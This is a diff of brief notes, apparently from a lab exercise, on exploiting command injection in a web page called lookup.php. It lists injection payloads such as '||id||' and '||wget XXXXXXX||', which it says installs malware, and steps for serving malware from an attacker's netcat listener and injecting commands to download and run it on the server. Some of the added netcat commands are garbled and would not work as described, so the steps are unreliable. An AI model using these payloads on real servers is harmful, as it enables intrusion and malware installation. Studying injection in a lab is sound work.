@@ -1,17 +1,20 @@
 lookup.php
-Injection cmd : ' || Attack cmd you want || '
+Injection cmd : ' || Attack cmd you want'
 can successful exc system("Attack cmd");
-example :
-'||id||' : show the server info
-'||ls||' : show the server directory
-'||wget XXXXXXX||' : can install malware to the server
+process:
+1. Attacker> nc -lvnp 7777 < file.txt (malware)
+2. goto the Web target/lookup.php
+3. Injection cmd : '||nc -zv 7777 > file.txt (download malware)
+4. Injection cmd : '||open file.txt (execute malware)
 
+
+hit:
 Command conjunction :
 
-char     description
-;        end of the command
-&        let command run in background
-|        pipe, let the forward output to be the next input of command
-||       OR, if the forward command is failed, execute the next command
-&&       AND,if the forward command is failed, do not execute the next.
+ascii char     description
+59    ;        end of the command
+38    &        let command run in background
+124   |        pipe, let the forward output to be the next input of command
+      ||       OR, if the forward command is failed, execute the next command
+      &&       AND,if the forward command is failed, do not execute the next.
 
